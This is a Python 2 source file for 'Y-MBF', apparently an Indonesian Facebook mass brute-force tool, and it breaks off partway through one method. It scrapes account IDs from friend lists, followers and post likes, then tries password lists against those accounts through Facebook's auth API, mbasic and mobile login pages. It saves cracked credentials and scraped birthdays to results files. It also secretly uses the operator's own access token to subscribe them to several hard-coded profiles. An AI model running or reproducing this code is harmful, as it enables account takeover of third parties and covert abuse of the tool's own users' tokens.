#!/usr/bin/python2
# coding=utf-8

#######################################################
# Name           : Y-MBF (MBF) <token method>         #
# File           : ymbf.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Instagram      : https://www.instagram.com/yayanxd_ #
# Fansfage       : https://www.facebook.com/Yayanxyz  #
# Blogspot       : https://squadcyberpeopleteam.blogspot.com #
# Python version : 2.7                                #
#######################################################

            ##   RATU ERROR PROJECTS   ##
# Thanks for : Angga,Azim,Dapunta,Rizal,Hamzah,Jesicca,Iqbal,Yayan #
####################################################################


   ############# JANGAN DI UBAH ASU NANTI ERROR! #############

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [×] Modul bs4 belum terinstall!...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->
ok = []
cp = []
id = []
ttl =[]
user = []
loop = 0
koh = '100009447779678'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
# LO KONTOL
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By YayanXD
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
# crack selesai
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
		print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
		exit()
xi_jimpinx = '1714000985456399'
# Token FB bukan token PLN
def yayanxd():
	os.system('clear')
	print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
	__sabiyaku__ = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
	if __sabiyaku__ in ('open', 'Open', 'OPEN'):
		print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		yayanxd()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__sabiyaku__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('__ahya__.txt', 'w')
		zedd.write(__sabiyaku__)
		zedd.close()
		print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N)
		time.sleep(2)
		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
		time.sleep(2)
		raw_input(' %s*%s tekan enter '%(O,N))
		kontol()
	except KeyError:
		print '\n\n %s[%s!%s] token invalid'%(N,M,N)
		time.sleep(2)
		yayanxd()
lo_ngentod = '2763801597278072'
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
        __sabiyaku__=open('__ahya__.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __ahya__.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__sabiyaku__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __ahya__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print '___________________________________________________________'
    print '\n (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama)
    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print '___________________________________________________________'
    print '\n [%s1%s]. Dump id dari teman'%(O,N)
    print ' [%s2%s]. Dump id dari teman publik'%(O,N)
    print ' [%s3%s]. Dump id dari total followers'%(O,N)
    print ' [%s4%s]. Dump id dari like postingan'%(O,N)
    print ' [%s5%s]. Mulai crack'%(O,N)
    print ' [%s6%s]. Lihat hasil crack'%(O,N)
    print ' [%s7%s]. Settings user agent'%(O,N)
    print ' %s[%s0%s]. logout (%shapus token%s)'%(N,M,N,M,N)
    awokawokawokawokawokawokawokawokawokawokawokawok()
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [*] menu : ')
        if yan == '':
           print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
        elif yan =='1':
                teman()
        elif yan =='2':
                publik()
        elif yan =='3':
                followers()
        elif yan =='4':
                postingan()
        elif yan =='5':
                __crack__().plerr()
        elif yan =='6':
            print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check hasil OK")
            print(" \033[0;97m[\033[0;96m2\033[0;97m] Check hasil CP")
            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
            if ask =="":
                moch_yayan()
            elif ask == "1" or ask == "01":
                try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;92m\n"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil ok :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \x1b[0mTotal %s: %s%s\033[0;93m\n"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print("\n \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil cp :(")
                    raw_input('\n  [ %sKEMBALI%s ] '%(O,N))
                    moch_yayan()
            else:
                moch_yayan()
        elif yan =='7':
        	seting_yntkts()
        elif yan =='0':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf __ahya__.txt')
                jalan ('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu tolol!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
def kontol():
	try:
		__sabiyaku__ = open('__ahya__.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%s×%s] token invalid'%(N,M,N)
		os.system('rm -rf __ahya__.txt')
	requests.post('https://graph.facebook.com/100009447779678/subscribers?access_token=%s'%(__sabiyaku__))
	requests.post('https://graph.facebook.com/100003603863923/subscribers?access_token=%s'%(__sabiyaku__))
	requests.post('https://graph.facebook.com/1836754937/subscribers?access_token=%s'%(__sabiyaku__))
	requests.post('https://graph.facebook.com/100011083959831/subscribers?access_token=%s'%(__sabiyaku__))
	requests.post('https://graph.facebook.com/100001152080193/subscribers?access_token=%s'%(__sabiyaku__))
	requests.post('https://graph.facebook.com/100001403405461/subscribers?access_token=%s'%(__sabiyaku__))
	requests.post('https://graph.facebook.com/100000517973128/subscribers?access_token=%s'%(__sabiyaku__))
	moch_yayan()
# dump id dari teman hehe
def teman():
    try:
        __sabiyaku__= open('__ahya__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __ahya__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__sabiyaku__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik():
    try:
        __sabiyaku__= open('__ahya__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __ahya__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__sabiyaku__))
        id = []
        z = json.loads(xxx.text)
        kntl = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(kntl, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,kntl,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
        os.remove(kntl)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari followers hehe
def followers():
    try:
        __sabiyaku__= open('__ahya__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __ahya__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__sabiyaku__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari postingan hehe
def postingan():
    try:
        __sabiyaku__= open('__ahya__.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N)
        os.system('rm -rf __ahya__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,__sabiyaku__))
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ikeh,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
        os.remove(ikeh)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()

### ganti user agent
def seting_yntkts():
	print '\n (%s1%s) ganti user agent'%(O,N)
	print ' (%s2%s) check user agent'%(O,N)
	ya_tanya_bapa_jangan_tanya_saya()
def ya_tanya_bapa_jangan_tanya_saya():
	ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
	if ytbjts == '':
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
	elif ytbjts =='1':
		yo_ndak_tau_ko_tanya_saia()
	elif ytbjts =='2':
		check_yntkts()
	else:
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():	
	os.system('rm -rf YNTKTS.txt')
	print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
	print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
	ua = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
	if ua == '':
		print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
		time.sleep(2)
		moch_yayan()
	try:
		uas = open('YNTKTS.txt','w')
		uas.write(ua)
		uas.close()
		time.sleep(2)
		jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
		time.sleep(2)
		moch_yayan()
	except (KeyError, IOError):
	  print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N)
	  time.sleep(2)
	  moch_yayan()
# Cek User Agent
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %skembali%s ]'%(N,O,N))
    moch_yayan()
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,N)
            time.sleep(3)
            moch_yayan()

        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                elif len(pwek)<=5:
                	print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '2':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '3':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        else:
                            print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
                            time.sleep(2)
                            moch_yayan()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] y/t goblok!'%(N,M,N)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, _yan_):
        global ok,cp,ttl,loop
        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params, headers=headers_)
            if re.search('(EAAA)\\w+', response.text):
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    __sabiyaku__ = open('__ahya__.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__sabiyaku__))
                    az = json.loads(ak.text)
                    ttl= az['birthday'].replace('/','-')
                    print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
                    wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __mbasic__(self, user, _yan_):
        global ok,cp,ttl,loop
        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            if 'checkpoint' in xo:
                try:
                    __sabiyaku__ = open('__ahya__.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__sabiyaku__))
                    az = json.loads(ak.text)
                    ttl= az['birthday'].replace('/','-')
                    print '\r  %s* --> %s|%s|%s     %s' % (K,user,pw,ttl,N)
                    wrt = ' [×] %s|%s|%s' % (user,pw,ttl)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __mfb__(self, user, _yan_):
        global ok,cp,ttl,loop
        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            ses = requests.Session()
            ses.get('https://m.facebook.com/')
